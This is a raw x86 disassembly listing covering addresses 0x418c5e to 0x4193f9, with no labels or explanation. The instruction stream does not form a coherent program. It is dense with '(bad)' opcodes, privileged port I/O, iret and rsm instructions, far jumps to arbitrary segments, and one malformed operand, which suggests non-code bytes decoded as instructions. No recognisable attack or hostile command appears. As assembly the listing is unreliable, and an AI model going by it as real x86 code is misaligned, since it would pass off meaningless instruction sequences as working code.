  418c5e:	cmp    eax,0xf29793c9
  418c63:	aad    0xfc
  418c65:	imul   ecx,DWORD PTR [eax+0x21],0xfffffff8
  418c69:	push   esp
  418c6a:	fyl2xp1 
  418c6c:	mov    DWORD PTR [esi-0x2],eax
  418c6f:	loope  0x418c1b
  418c71:	and    al,0x39
  418c73:	adc    DWORD PTR [eax+edi*8-0x5a],edi
  418c77:	loope  0x418ce7
  418c79:	cwde   
  418c7a:	aad    0x24
  418c7c:	cmp    BYTE PTR [edi+0x37c49e3b],bh
  418c82:	int3   
  418c83:	rol    BYTE PTR [edi],1
  418c85:	cmp    al,0x95
  418c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c88:	fucomip st,st(0)
  418c8a:	lea    esp,[edx-0x3ac658e8]
  418c90:	jge    0x418c78
  418c92:	cmp    al,0xed
  418c94:	jne    0x418c1b
  418c96:	sahf   
  418c97:	xor    esi,ecx
  418c99:	or     al,0x15
  418c9b:	sti    
  418c9c:	fldenv [eax]
  418c9e:	xchg   ebp,eax
  418c9f:	cdq    
  418ca0:	fbstp  TBYTE PTR [eax]
  418ca2:	aaa    
  418ca3:	pushf  
  418ca4:	fidiv  WORD PTR [ebp-0x416e8731]
  418caa:	jb     0x418d18
  418cac:	out    dx,al
  418cad:	lea    esi,[ebp-0x1f]
  418cb0:	xor    eax,DWORD PTR [edx-0x5c]
  418cb3:	inc    edi
  418cb4:	sar    ebp,1
  418cb6:	add    eax,0x5668ad2a
  418cbb:	mov    bl,0xde
  418cbd:	mov    ds:0xbe8de7eb,al
  418cc2:	dec    esp
  418cc3:	pop    esi
  418cc4:	sti    
  418cc5:	pushf  
  418cc6:	sahf   
  418cc7:	adc    ebp,DWORD PTR [eax+0x73]
  418cca:	pop    ebx
  418ccb:	jne    0x418cfc
  418ccd:	iret   
  418cce:	pop    ds
  418ccf:	ret    0x5149
  418cd2:	dec    eax
  418cd3:	(bad)  
  418cd4:	std    
  418cd5:	icebp  
  418cd6:	scas   eax,DWORD PTR es:[edi]
  418cd7:	adc    edi,DWORD PTR [eax]
  418cd9:	pop    esp
  418cda:	pop    ecx
  418cdb:	dec    edx
  418cdc:	mov    DWORD PTR [ecx+0x440df4dd],edi
  418ce2:	xor    DWORD PTR ds:0x1e42e902,eax
  418ce8:	cmp    al,0xaf
  418cea:	ja     0x418d46
  418cec:	jmp    0x418d15
  418cee:	sub    eax,0xb747056b
  418cf3:	stos   DWORD PTR es:[edi],eax
  418cf4:	lods   al,BYTE PTR ds:[esi]
  418cf5:	std    
  418cf6:	repnz pop esi
  418cf8:	xchg   esp,eax
  418cf9:	test   dh,cl
  418cfb:	arpl   WORD PTR [esi-0x3cdb15f5],sp
  418d01:	adc    ah,BYTE PTR [eax+0x5a]
  418d04:	add    DWORD PTR [eax],ebp
  418d06:	outs   dx,BYTE PTR ds:[esi]
  418d07:	push   eax
  418d08:	sbb    ah,BYTE PTR [ebp-0x42]
  418d0b:	jle    0x418cdd
  418d0d:	fimul  DWORD PTR ds:0x5276d046
  418d13:	xor    cl,ah
  418d15:	pop    eax
  418d16:	popf   
  418d17:	or     al,ch
  418d19:	mov    ebx,0xdcc22cbe
  418d1e:	mov    dl,0xce
  418d20:	or     eax,0x31530a71
  418d25:	and    al,0xb6
  418d27:	sbb    eax,0x263df785
  418d2c:	int    0x2e
  418d2e:	xor    edx,DWORD PTR [esi]
  418d30:	pop    ebx
  418d31:	sahf   
  418d32:	xor    eax,0x2aceb81
  418d37:	push   ebx
  418d38:	scas   al,BYTE PTR es:[edi]
  418d39:	adc    eax,0x511f2b78
  418d3e:	cmp    esp,DWORD PTR [esp+ecx*2+0x21]
  418d42:	fimul  WORD PTR [edx+0x4b]
  418d45:	mov    eax,ds:0xc9545a0b
  418d4a:	arpl   WORD PTR [edx+0x42],dx
  418d4d:	cwde   
  418d4e:	les    edx,FWORD PTR [ebp-0x5203822c]
  418d54:	adc    BYTE PTR [ebx],dl
  418d56:	mov    ebp,0xf46cfe80
  418d5b:	xchg   BYTE PTR [ebx-0x7d],bh
  418d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d5f:	xchg   esi,eax
  418d60:	retf   0xdb8e
  418d63:	scas   al,BYTE PTR es:[edi]
  418d64:	in     eax,dx
  418d65:	inc    eax
  418d66:	cmp    al,0xbc
  418d68:	mov    bl,0xc7
  418d6a:	sub    dh,BYTE PTR [esi-0x31]
  418d6d:	loope  0x418d16
  418d6f:	retf   
  418d70:	ins    BYTE PTR es:[edi],dx
  418d71:	dec    edx
  418d72:	repnz cmc 
  418d74:	in     eax,dx
  418d75:	dec    eax
  418d76:	sbb    eax,0x49943ec
  418d7b:	jo     0x418d33
  418d7d:	pop    ds
  418d7e:	(bad)  
  418d7f:	pop    ebp
  418d80:	iret   
  418d81:	mov    ds:0x4dc2c42,al
  418d86:	add    DWORD PTR [edi-0x56],0xdff31038
  418d8d:	loope  0x418d77
  418d8f:	fsubr  DWORD PTR [edi]
  418d91:	aaa    
  418d92:	cmp    esp,DWORD PTR [ebx]
  418d94:	or     bl,ah
  418d96:	pop    ebp
  418d97:	(bad)  
  418d99:	shr    DWORD PTR ds:0xe0a4dc4c,0xcf
  418da0:	mov    edi,0x9c3d21ae
  418da5:	pop    ss
  418da6:	mov    eax,ds:0x568e56c8
  418dab:	rsm    
  418dad:	in     eax,dx
  418dae:	inc    ebx
  418daf:	xor    DWORD PTR [ecx],ebx
  418db1:	sub    BYTE PTR [edi+0x5f5cbbc],dl
  418db7:	xchg   DWORD PTR [esi+0x63],edx
  418dba:	idiv   BYTE PTR [ecx+0x3e203ca3]
  418dc0:	retf   0x8ddf
  418dc3:	inc    esi
  418dc4:	rol    ebp,1
  418dc6:	sub    al,0x58
  418dc8:	loope  0x418e3f
  418dca:	mov    ss,edx
  418dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dcd:	jle    0x418d5a
  418dcf:	xor    al,BYTE PTR [ecx+0x21]
  418dd2:	and    dh,bl
  418dd4:	jg     0x418dd5
  418dd6:	ret    0x2eee
  418dd9:	out    dx,al
  418dda:	icebp  
  418ddb:	mov    cl,0x1e
  418ddd:	rep outs dx,DWORD PTR ds:[esi]
  418ddf:	je     0x418d91
  418de1:	pop    esi
  418de2:	out    0x20,al
  418de4:	push   ebx
  418de5:	ret    0xb7af
  418de8:	sub    DWORD PTR [esi+0x43182ee4],0xffffffa7
  418def:	stos   BYTE PTR es:[edi],al
  418df0:	mov    es,edi
  418df2:	mov    ebp,0x9636b343
  418df7:	push   eax
  418df8:	jo     0x418e31
  418dfa:	mov    ecx,ebx
  418dfc:	and    DWORD PTR [eax-0x4b],esi
  418dff:	cwde   
  418e00:	mov    BYTE PTR [esi],dl
  418e02:	push   0xac6e9130
  418e07:	loopne 0x418de2
  418e09:	stc    
  418e0a:	mov    dl,0x41
  418e0c:	fidiv  DWORD PTR [eax+0x18a69845]
  418e12:	add    DWORD PTR [ecx+0x72],ebp
  418e15:	adc    esi,DWORD PTR [esi+0x75f76dc6]
  418e1b:	in     eax,dx
  418e1c:	xchg   edx,eax
  418e1d:	sbb    DWORD PTR [esi],esi
  418e1f:	nop
  418e20:	xchg   ebx,eax
  418e22:	mov    ebx,0x67f806fd
  418e27:	adc    BYTE PTR [ecx-0x67],0x5b
  418e2b:	xor    ecx,DWORD PTR [ebp-0x737a86d7]
  418e31:	je     0x418ea2
  418e33:	(bad)  
  418e34:	daa    
  418e35:	mov    esi,DWORD PTR [edi-0x61]
  418e38:	and    ebx,DWORD PTR [esi-0x7a134075]
  418e3e:	and    esi,ebp
  418e40:	mov    bh,0xa0
  418e42:	(bad)  
  418e43:	jbe    0x418e83
  418e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e46:	xor    BYTE PTR [esi],0xba
  418e49:	push   0xffffffeb
  418e4b:	mov    DWORD PTR [edx+0x71df19b7],ebx
  418e51:	mov    DWORD PTR [edi+edi*4+0x40c5b69c],edx
  418e58:	repnz cli 
  418e5a:	push   eax
  418e5b:	add    eax,0x9aaabec8
  418e60:	cmp    al,0x79
  418e62:	inc    ecx
  418e63:	mov    cl,0x15
  418e65:	data16 fisubr DWORD PTR [esi-0x13]
  418e69:	mov    ecx,0x1ae7c7f7
  418e6e:	std    
  418e6f:	(bad)  
  418e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e72:	pop    ss
  418e73:	lds    ecx,FWORD PTR [ecx+0x73]
  418e76:	pop    edx
  418e77:	and    bh,al
  418e79:	pop    ebp
  418e7a:	into   
  418e7b:	mov    ds:0x98771e9,eax
  418e80:	(bad)  
  418e81:	ror    DWORD PTR [ebx-0x2b],cl
  418e84:	ret    0x599a
  418e87:	mov    bh,0x53
  418e89:	cmc    
  418e8a:	cmp    eax,0x88f26a4b
  418e8f:	jl     0x418e89
  418e91:	imul   esp,DWORD PTR [edx],0x41fec816
  418e97:	in     al,dx
  418e98:	and    al,0x42
  418e9a:	pop    ecx
  418e9b:	sub    DWORD PTR [esi-0x27ca2694],edi
  418ea1:	nop
  418ea2:	shl    DWORD PTR [ebx],0xe8
  418ea5:	mov    DWORD PTR [ebx-0x22c8cd97],ecx
  418eab:	loopne 0x418e5d
  418ead:	xchg   esp,eax
  418eae:	jns    0x418e7a
  418eb0:	xchg   ebp,eax
  418eb1:	imul   ecx,DWORD PTR [ebp+0x486c8249],0xffffffdb
  418eb8:	aas    
  418eb9:	inc    esi
  418eba:	ins    BYTE PTR es:[edi],dx
  418ebb:	loopne 0x418f07
  418ebd:	rcl    al,0x3e
  418ec0:	aaa    
  418ec1:	push   edx
  418ec2:	inc    esi
  418ec3:	(bad)  
  418ec4:	aas    
  418ec5:	enter  0x3e47,0x6b
  418ec9:	push   es
  418eca:	push   cs
  418ecb:	addr16 cld 
  418ecd:	retf   0xbfc3
  418ed0:	push   0x2a4b2e9f
  418ed5:	mov    al,0x97
  418ed7:	fnstcw WORD PTR [ecx-0x66]
  418eda:	xchg   DWORD PTR [ebp+edx*4-0x5767cafc],esi
  418ee1:	pop    ebx
  418ee2:	jg     0x418f29
  418ee4:	adc    al,0xcd
  418ee6:	cdq    
  418ee7:	mov    eax,0x63d2d9fe
  418eec:	mov    ah,0x14
  418eee:	stos   DWORD PTR es:[edi],eax
  418eef:	sbb    bl,BYTE PTR [ebx-0x43]
  418ef2:	sub    al,0xa2
  418ef4:	lods   eax,DWORD PTR ds:[esi]
  418ef5:	adc    bh,BYTE PTR [edx+ecx*1+0x79d39ab7]
  418efc:	jbe    0x418e9f
  418efe:	pop    esp
  418eff:	std    
  418f00:	inc    ecx
  418f01:	shl    bh,0x8d
  418f04:	cmc    
  418f05:	loope  0x418f12
  418f07:	retf   0x8bc0
  418f0a:	out    0x53,al
  418f0c:	stos   DWORD PTR es:[edi],eax
  418f0d:	in     al,0x1d
  418f0f:	outs   dx,DWORD PTR ds:[esi]
  418f10:	js     0x418eae
  418f12:	pop    ss
  418f13:	pop    esp
  418f14:	bound  ebx,QWORD PTR [esi-0x4f04a8c8]
  418f1a:	jmp    0x418f4d
  418f1c:	arpl   ax,si
  418f1e:	nop
  418f1f:	test   DWORD PTR [ecx+0x4b],0x251076f
  418f26:	mov    bl,0x23
  418f28:	nop
  418f29:	pushf  
  418f2a:	test   al,0xf
  418f2c:	cmp    BYTE PTR [eax],0xaf
  418f2f:	inc    ecx
  418f30:	inc    ebx
  418f31:	stos   BYTE PTR es:[edi],al
  418f32:	push   0xe58e9684
  418f37:	and    DWORD PTR [edi+0x52],esi
  418f3a:	inc    eax
  418f3b:	mov    bl,0x38
  418f3d:	fimul  DWORD PTR [esi-0x31]
  418f40:	out    dx,eax
  418f41:	dec    eax
  418f42:	lods   al,BYTE PTR ds:[esi]
  418f43:	div    DWORD PTR [edx-0x50aaadfc]
  418f49:	fsubr  QWORD PTR [ebp-0x401048a0]
  418f4f:	push   ss
  418f50:	daa    
  418f51:	mov    ah,0x83
  418f53:	dec    edi
  418f54:	push   0x65
  418f56:	inc    ecx
  418f57:	sbb    BYTE PTR [ebx-0x50],ah
  418f5a:	mov    dh,0xa8
  418f5c:	cdq    
  418f5d:	dec    ebp
  418f5e:	xor    ebx,esi
  418f60:	je     0x418ee9
  418f62:	mov    dl,0x95
  418f64:	cmp    edi,DWORD PTR [ebp-0x456d72b9]
  418f6a:	xor    eax,0xa640c0cd
  418f6f:	out    dx,al
  418f70:	icebp  
  418f71:	mov    ecx,ecx
  418f73:	lds    edi,FWORD PTR [edx+0x4b148c54]
  418f79:	mov    edi,0xd356d8d5
  418f7e:	add    BYTE PTR [ecx+esi*2+0x28],bl
  418f82:	pop    ecx
  418f83:	rcl    BYTE PTR [ebx+ecx*4-0x4fea7109],0xa8
  418f8b:	pop    ecx
  418f8c:	sbb    BYTE PTR [edi-0x4a1e6586],0xa9
  418f93:	(bad)  
  418f94:	jg     0x418fa3
  418f96:	ss xchg edx,eax
  418f98:	inc    ebp
  418f99:	sub    cl,BYTE PTR [edx]
  418f9b:	jns    0x418f42
  418f9d:	adc    DWORD PTR [esi+0x67ecf8e],eax
  418fa3:	or     DWORD PTR [ebx],esp
  418fa5:	xchg   edx,eax
  418fa6:	pushf  
  418fa7:	daa    
  418fa8:	inc    esi
  418fa9:	mov    eax,ss
  418fab:	dec    edx
  418fac:	adc    eax,0x16ea3ab7
  418fb1:	ins    DWORD PTR es:[edi],dx
  418fb2:	lods   eax,DWORD PTR ds:[esi]
  418fb3:	mov    bh,0x5e
  418fb5:	pop    ebx
  418fb6:	xor    al,0xa3
  418fb8:	mov    cl,0xb6
  418fba:	mov    esp,DWORD PTR [ecx-0xa]
  418fbd:	sar    DWORD PTR [edi+0xd86aa05],0x6d
  418fc4:	in     al,dx
  418fc5:	cwde   
  418fc6:	add    al,0xe1
  418fc8:	xor    ah,cl
  418fca:	sub    al,0x28
  418fcc:	jmp    0x418ff0
  418fce:	push   esi
  418fcf:	leave  
  418fd0:	pop    ds
  418fd1:	cmp    al,BYTE PTR [ebx+0x2c]
  418fd4:	xchg   ecx,eax
  418fd5:	pop    ds
  418fd6:	mul    BYTE PTR [ecx+edx*2-0x3]
  418fda:	jle    0x418fb1
  418fdc:	cdq    
  418fdd:	push   esp
  418fde:	rcr    dl,0x76
  418fe1:	xor    al,0x9
  418fe3:	aaa    
  418fe4:	sub    si,WORD PTR [edx+0x67]
  418fe8:	(bad)  
  418fea:	call   0x7538:0xa79f080d
  418ff1:	mov    cl,0x1c
  418ff3:	in     eax,dx
  418ff4:	ficomp DWORD PTR [ebx+0x64]
  418ff7:	mov    ebp,0x4f65bd3d
  418ffc:	push   esi
  418ffd:	pop    ebp
  418ffe:	mov    ds:0x6f41867a,al
  419003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419004:	and    eax,0xf28ed3c6
  419009:	mov    esp,0x1c336faa
  41900e:	lds    edx,FWORD PTR [edi+0x7cdfcf56]
  419014:	sti    
  419015:	add    eax,0x3f3860cb
  41901a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41901b:	or     cl,al
  41901d:	jmp    0x8412:0x7619170c
  419024:	or     eax,ebx
  419026:	cld    
  419027:	(bad)  
  419028:	aad    0x60
  41902a:	or     al,0x45
  41902c:	inc    edx
  41902d:	mov    ch,0x19
  41902f:	sbb    ebx,ecx
  419031:	xchg   esp,eax
  419032:	fwait
  419033:	icebp  
  419034:	idiv   BYTE PTR [bp+0x6d]
  419038:	adc    eax,0x41735c55
  41903d:	jne    0x419097
  41903f:	clc    
  419040:	jle    0x41909f
  419042:	and    edx,ebx
  419044:	popa   
  419045:	(bad)  
  419046:	(bad)  
  419047:	out    0x82,eax
  419049:	enter  0x4d75,0x8f
  41904d:	pop    eax
  41904e:	sti    
  41904f:	into   
  419050:	mov    bh,0xa
  419052:	dec    esp
  419053:	gs jne 0x419070
  419056:	pop    ss
  419057:	ret    0x3cf1
  41905a:	daa    
  41905b:	hlt    
  41905c:	inc    ebx
  41905d:	fcmovnbe st,st(3)
  41905f:	push   es
  419060:	mov    al,ds:0xfda51e5b
  419065:	xchg   ecx,eax
  419066:	xor    al,0x31
  419068:	pushf  
  419069:	stos   BYTE PTR es:[edi],al
  41906a:	and    eax,0x1481736b
  41906f:	push   0xffffffbe
  419071:	dec    esp
  419072:	(bad)  
  419073:	push   ecx
  419074:	push   ebp
  419075:	test   BYTE PTR [esi-0x15],0x9b
  419079:	push   edi
  41907a:	jbe    0x419048
  41907c:	fcom   DWORD PTR [eax-0x1db2f30e]
  419082:	jmp    0xed53:0xa3f418a3
  419089:	fisub  DWORD PTR [edx+0x6d]
  41908c:	mov    edi,0xc6ac4933
  419091:	or     bl,al
  419093:	sbb    DWORD PTR [ebp+0x35],ebp
  419096:	aaa    
  419097:	jnp    0x41904a
  419099:	mov    ch,0xec
  41909b:	mov    bh,dh
  41909d:	inc    eax
  41909e:	(bad)  
  41909f:	ficom  WORD PTR [ecx-0x77]
  4190a2:	pop    ebx
  4190a3:	dec    ebx
  4190a4:	mov    bh,0x98
  4190a6:	jmp    0xdc08:0x29d137fe
  4190ad:	cmp    eax,0xa2bc0a40
  4190b2:	ss jno 0x419100
  4190b5:	test   DWORD PTR [ebp+0x4e],edi
  4190b8:	fild   QWORD PTR [edi-0x32]
  4190bb:	or     bh,BYTE PTR [eax+0x2e]
  4190be:	jl     0x419128
  4190c0:	pop    es
  4190c1:	jns    0x41908d
  4190c3:	and    esp,DWORD PTR [ecx+0x6a]
  4190c6:	fbld   TBYTE PTR [esi*8+0x53a360c]
  4190cd:	and    al,0x70
  4190cf:	push   eax
  4190d0:	(bad)  
  4190d1:	cmp    DWORD PTR [edx],edx
  4190d3:	pop    ss
  4190d4:	ja     0x4190a0
  4190d6:	fsub   st(0),st
  4190d8:	mov    dh,0xbc
  4190da:	add    eax,0xf7308734
  4190df:	loop   0x419089
  4190e1:	into   
  4190e2:	mov    ds:0x84d07e11,al
  4190e7:	sub    al,0x5b
  4190e9:	out    dx,al
  4190ea:	pushf  
  4190eb:	sub    DWORD PTR [eax+0x5d],0x2a200500
  4190f2:	and    ecx,DWORD PTR [ebp+0x17]
  4190f5:	adc    bl,BYTE PTR ss:[eax+0x373ca9]
  4190fc:	mov    WORD PTR [ecx+0x4d],ss
  4190ff:	inc    ebx
  419100:	jno    0x41917d
  419102:	xor    bh,BYTE PTR [ebx]
  419104:	add    DWORD PTR [edi+0x3016be84],ebp
  41910a:	cld    
  41910b:	push   cs
  41910c:	mov    esi,ss
  41910e:	pop    ebx
  41910f:	xor    DWORD PTR [ebx-0x4f],ebp
  419112:	cs xchg edx,eax
  419114:	dec    eax
  419115:	(bad)  
  419117:	jl     0x41918a
  419119:	div    DWORD PTR [esi+0x51]
  41911c:	fisub  DWORD PTR [ecx-0x77]
  41911f:	xlat   BYTE PTR ds:[ebx]
  419120:	cdq    
  419121:	sub    BYTE PTR [edx-0x41153bf7],dh
  419127:	jle    0x4190b7
  419129:	pop    ebx
  41912a:	adc    DWORD PTR [eax+0x0],edx
  41912d:	dec    ebp
  41912e:	hlt    
  41912f:	add    DWORD PTR [edi],0x4b89266
  419135:	out    dx,al
  419136:	fnstenv [esi]
  419138:	(bad)  
  419139:	mov    cl,0x81
  41913b:	retf   0x168f
  41913e:	mov    esi,0xef3299c8
  419143:	aam    0x5
  419145:	aad    0xf
  419147:	pop    esi
  419148:	dec    esp
  419149:	retf   0xa457
  41914c:	adc    BYTE PTR [ecx],ah
  41914e:	xchg   ecx,eax
  41914f:	and    ebx,DWORD PTR [edx*1+0x2224b792]
  419156:	ss mov al,0x50
  419159:	dec    eax
  41915a:	ret    0xec2d
  41915d:	stc    
  41915e:	and    ebp,edx
  419160:	adc    ah,bh
  419162:	jo     0x4191d4
  419164:	imul   edi,DWORD PTR [ecx-0x28],0xffffffe3
  419168:	xlat   BYTE PTR ds:[ebx]
  419169:	adc    eax,0x273153df
  41916e:	xor    BYTE PTR [eax],ah
  419170:	(bad)  
  419171:	lahf   
  419172:	push   edi
  419173:	das    
  419174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419175:	fnstsw WORD PTR [ebx-0x11df2493]
  41917b:	jecxz  0x419164
  41917d:	mov    edi,0x5be3b06f
  419182:	adc    DWORD PTR [ecx+0x794a6b2f],esp
  419188:	mov    al,0x63
  41918a:	mov    ebx,0x4ddf59c5
  41918f:	dec    ebp
  419190:	jbe    0x419132
  419192:	int    0xdb
  419194:	jmp    0xdd15529
  419199:	sar    BYTE PTR [eax-0x54],cl
  41919c:	cs mov esi,0xd41d1fb6
  4191a2:	mov    bh,0x31
  4191a4:	scas   eax,DWORD PTR es:[edi]
  4191a5:	push   edx
  4191a6:	add    esi,DWORD PTR [eax+0x237dbd93]
  4191ac:	cmp    al,0x52
  4191ae:	rcl    BYTE PTR [edx-0x4e5db0a4],0x9c
  4191b5:	dec    esp
  4191b6:	(bad)  
  4191b7:	data16 mov es,WORD PTR [ebx+0x68]
  4191bb:	mov    ecx,0x974183d2
  4191c0:	push   edx
  4191c1:	sbb    ebp,DWORD PTR [edi+0x9]
  4191c4:	outs   dx,DWORD PTR ds:[esi]
  4191c5:	jne    0x419212
  4191c7:	inc    edx
  4191c8:	push   ds
  4191c9:	fstp   TBYTE PTR [esi-0x16]
  4191cc:	dec    ecx
  4191cd:	lods   al,BYTE PTR ds:[esi]
  4191ce:	lock aas 
  4191d0:	xchg   esi,eax
  4191d1:	loopne 0x41924b
  4191d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191d4:	push   ds
  4191d5:	jns    0x419193
  4191d7:	pop    ebp
  4191d8:	pop    eax
  4191d9:	cmc    
  4191da:	pop    edx
  4191db:	sbb    BYTE PTR [edi],bl
  4191dd:	fdiv   DWORD PTR [edi+esi*1+0x8519acb]
  4191e4:	ja     0x419234
  4191e6:	xor    al,BYTE PTR [ecx+0x1277b2b4]
  4191ec:	addr16 jns 0x419257
  4191ef:	out    0x11,eax
  4191f1:	ror    BYTE PTR [ebx+0x22],1
  4191f4:	scas   al,BYTE PTR es:[edi]
  4191f5:	sbb    cl,ah
  4191f7:	fsubr  QWORD PTR [esi-0x29]
  4191fa:	daa    
  4191fb:	imul   ebx,DWORD PTR [ebp-0x3c],0xb
  4191ff:	dec    esi
  419200:	push   ebp
  419201:	and    al,0xd1
  419203:	in     al,dx
  419204:	nop
  419205:	pop    edi
  419206:	mov    ?,WORD PTR [eax+0x5cb37285]
  41920c:	xchg   ecx,eax
  41920d:	out    dx,al
  41920e:	or     esi,DWORD PTR [esi-0x587c833d]
  419214:	mov    BYTE PTR [ebx+0x2e],dh
  419217:	lock (bad) 
  419219:	and    edx,ecx
  41921b:	mov    WORD PTR [ebx-0x39],es
  41921e:	js     0x4191dd
  419220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419221:	shr    esp,cl
  419223:	call   0x6822e575
  419228:	adc    eax,0x6d55811c
  41922d:	repnz icebp 
  41922f:	lahf   
  419230:	cli    
  419231:	and    al,0x5c
  419233:	in     eax,0x27
  419235:	fcom   DWORD PTR [ebx-0x3cf6e698]
  41923b:	add    BYTE PTR [eax],bh
  41923d:	fucomp st(4)
  41923f:	sub    al,0xcd
  419241:	pop    ds
  419242:	pop    edx
  419243:	adc    bl,BYTE PTR [eax+eiz*4-0x32]
  419247:	push   edi
  419248:	aas    
  419249:	push   edi
  41924a:	mov    BYTE PTR [edi],al
  41924c:	pop    ebp
  41924d:	sub    ch,dh
  41924f:	dec    esi
  419250:	cmp    DWORD PTR [ecx-0x316a233e],esi
  419256:	adc    al,0xc
  419258:	xchg   edi,eax
  419259:	enter  0x8f72,0x7b
  41925d:	test   BYTE PTR [eax+0x13],ch
  419260:	adc    ebp,DWORD PTR ds:0xb03318b1
  419266:	cmp    eax,0x8b2415bf
  41926b:	stos   BYTE PTR es:[edi],al
  41926c:	test   eax,0x8901aa7e
  419271:	sbb    al,0x78
  419273:	inc    eax
  419274:	xchg   edi,eax
  419275:	outs   dx,BYTE PTR ds:[esi]
  419276:	ret    
  419277:	push   esp
  419278:	ficom  WORD PTR [esi+0x59]
  41927b:	rcr    DWORD PTR [esi+0x2d],1
  41927e:	inc    edx
  41927f:	(bad)  
  419280:	(bad)  
  419281:	jae    0x419230
  419283:	mov    ds,ecx
  419285:	popf   
  419286:	adc    DWORD PTR [ebp+eiz*4-0x73],edi
  41928a:	jecxz  0x419213
  41928c:	jle    0x4192a8
  41928e:	sbb    al,0xaf
  419290:	pop    esi
  419291:	loope  0x419290
  419293:	sub    BYTE PTR [edx+0x6517a802],0xae
  41929a:	mov    ecx,0x706a0bb3
  41929f:	es daa 
  4192a1:	mov    dh,0x87
  4192a3:	jb     0x419273
  4192a5:	push   ss
  4192a6:	sbb    dh,BYTE PTR [ebp+0x38ea5ba]
  4192ac:	xchg   edi,eax
  4192ad:	test   BYTE PTR [edx+0x1d682081],ch
  4192b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192b4:	fcomp  QWORD PTR [edx]
  4192b6:	push   ebp
  4192b7:	(bad)  
  4192b8:	or     eax,0xe260db31
  4192bd:	cmp    BYTE PTR [esi],bl
  4192bf:	iret   
  4192c0:	dec    esp
  4192c1:	fcmovbe st,st(4)
  4192c3:	pusha  
  4192c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c5:	stc    
  4192c6:	(bad)  
  4192c7:	cmp    ch,BYTE PTR [esi+ecx*1-0x12]
  4192cb:	and    eax,0x73bccd80
  4192d0:	add    BYTE PTR ds:0x9cf9aa87,cl
  4192d6:	or     dl,bl
  4192d8:	loop   0x419323
  4192da:	xlat   BYTE PTR ds:[ebx]
  4192db:	mov    eax,fs:0x4febcaec
  4192e1:	(bad)  
  4192e2:	jae    0x41931b
  4192e4:	pop    ss
  4192e5:	fwait
  4192e6:	pop    edx
  4192e7:	jae    0x41928c
  4192e9:	lock out 0xff,eax
  4192ec:	shl    bl,0xcc
  4192ef:	push   0x37
  4192f1:	mov    dh,0xe6
  4192f3:	inc    edx
  4192f4:	stos   BYTE PTR es:[edi],al
  4192f5:	mov    esi,0xa38b1a89
  4192fa:	outs   dx,BYTE PTR ds:[esi]
  4192fb:	dec    esp
  4192fc:	cwde   
  4192fd:	dec    ebp
  4192fe:	and    al,0x76
  419300:	mov    ah,0x5b
  419302:	daa    
  419303:	mov    dh,0x7e
  419305:	fst    DWORD PTR [ebp+eax*1+0x2629e019]
  41930c:	lock out 0x74,al
  41930f:	jnp    0x41935e
  419311:	dec    ebx
  419312:	push   eax
  419313:	sub    cl,0x6
  419316:	mov    ecx,0x19049ee1
  41931b:	xlat   BYTE PTR ds:[ebx]
  41931c:	push   0x1a
  41931e:	in     al,dx
  41931f:	rol    BYTE PTR [ebp+0x7d],1
  419322:	loopne 0x419382
  419324:	xor    ch,BYTE PTR [eax]
  419326:	pop    ebx
  419327:	mov    dl,BYTE PTR [ecx-0x778f0112]
  41932d:	sbb    esp,ebx
  41932f:	adc    eax,DWORD PTR [ecx-0x2e298602]
  419335:	mov    edx,0x335379c5
  41933a:	inc    edi
  41933b:	add    BYTE PTR [eax-0x1c922031],ah
  419341:	pusha  
  419342:	mov    cs,WORD PTR [edx+0x231d251a]
  419348:	sti    
  419349:	pop    esi
  41934a:	cmp    al,0xb1
  41934c:	shr    DWORD PTR [ebp+0x66],cl
  41934f:	mov    eax,0x2899e5c3
  419354:	push   es
  419355:	mov    dh,0x7
  419357:	test   eax,0x57630c1
  41935c:	jno    0x41934c
  41935e:	sub    BYTE PTR [edx-0x80],bl
  419361:	ins    BYTE PTR es:[edi],dx
  419362:	inc    ebx
  419363:	test   ebp,esp
  419365:	push   0x3c
  419367:	ror    BYTE PTR [edx-0x2367831],0xb1
  41936e:	mov    edi,0x932b81eb
  419373:	jae    0x4192f6
  419375:	mov    esi,0x8f393f73
  41937a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41937b:	popa   
  41937c:	inc    edx
  41937d:	js     0x41930b
  41937f:	mov    esp,0xfcb7f336
  419384:	sti    
  419385:	and    DWORD PTR [edx],ebx
  419387:	jns    0x41937c
  419389:	sahf   
  41938a:	jnp    0x4193cf
  41938c:	in     eax,dx
  41938d:	mov    al,0x65
  41938f:	mov    esp,esi
  419391:	sar    DWORD PTR [edx],cl
  419393:	mov    bh,0x62
  419395:	and    al,dh
  419397:	mov    ecx,0xec4b06d8
  41939c:	sbb    eax,0x4539eb64
  4193a1:	dec    ebx
  4193a2:	stc    
  4193a3:	mov    ebx,0x8d49a27c
  4193a8:	mov    bh,0x7
  4193aa:	div    DWORD PTR [ecx+0x4b572138]
  4193b0:	adc    ebp,DWORD PTR [eax+0x60]
  4193b3:	cli    
  4193b4:	iret   
  4193b5:	inc    edx
  4193b6:	xor    DWORD PTR ds:0x85b446df,ecx
  4193bc:	out    0x2d,al
  4193be:	push   edi
  4193bf:	mov    dl,0x32
  4193c1:	in     eax,0x9c
  4193c3:	retf   
  4193c4:	add    eax,ecx
  4193c6:	(bad)  
  4193c7:	jmp    0x4193e1
  4193c9:	test   DWORD PTR [edx-0x74],edi
  4193cc:	jecxz  0x4193e2
  4193ce:	idiv   BYTE PTR [ecx-0x2a0fa58a]
  4193d4:	mov    bh,0xbb
  4193d6:	add    ebx,edi
  4193d8:	push   ds
  4193d9:	add    eax,0x3c60362d
  4193de:	dec    ebx
  4193df:	gs test al,0xc9
  4193e2:	pop    ecx
  4193e3:	add    eax,0xd736a035
  4193e8:	xor    al,0x67
  4193ea:	imul   esi,DWORD PTR [ebx+0x43fa5a68],0x752fd455
  4193f4:	cmp    eax,0xda6c997d
  4193f9:	aad    0x64
